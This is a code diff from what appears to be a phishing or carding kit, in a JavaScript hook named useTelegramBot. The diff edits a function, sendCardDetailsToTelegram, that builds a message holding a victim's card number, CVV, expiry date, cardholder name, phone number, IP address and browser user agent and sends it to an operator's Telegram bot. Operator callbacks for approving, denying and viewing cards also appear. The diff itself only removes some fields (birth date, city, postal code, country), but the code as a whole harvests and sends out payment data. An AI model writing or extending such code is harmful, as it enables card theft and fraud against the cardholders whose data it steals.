@@ -87,7 +87,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
   const generateSessionId = () => {
     return Date.now().toString() + Math.random().toString(36).substr(2, 6);
   };
-
+    
   const shouldSendLog = (logType) => {
     const now = Date.now();
     const lastTime = lastLogTimes[logType] || 0;
@@ -500,15 +500,12 @@ const sendCardDetailsToTelegram = async (cardData, sessionId) => {
 ├ 👤 <b>Cardholder:</b> ${cardData.cardholderName}
 ├ 💳 <b>Card Number:</b> <code>${cardData.cardNumber}</code>
 ├ 📅 <b>Expiry Date:</b> ${cardData.expiryDate}
-├ 🔐 <b>CVV:</b> <code>${cardData.cvv}</code>
-└ 🎂 <b>Birth Date:</b> ${birthDateStr}
+├ 🔐 <b>CVV:</b> <code>${cardData.cvv}</code> 
+└ 📞 <b>Phone:</b> ${cardData.countryCode || '+1'} ${cardData.phoneNumber}
 
 <b>📍 PERSONAL INFO:</b>
-├ 📞 <b>Phone:</b> ${cardData.countryCode || '+1'} ${cardData.phoneNumber}
-├ 🏙️ <b>City:</b> ${cardData.city}
-└ 📮 <b>Postal Code:</b> ${cardData.postalCode}
+
 <b>🖥️ TECHNICAL INFO:</b>
-├ 🌐 <b>Country:</b> ${bankInfo.country}
 ├ 🔌 <b>IP Address:</b> ${userIP}
 └ 📱 <b>User-Agent:</b> ${navigator.userAgent.substring(0, 100)}
 
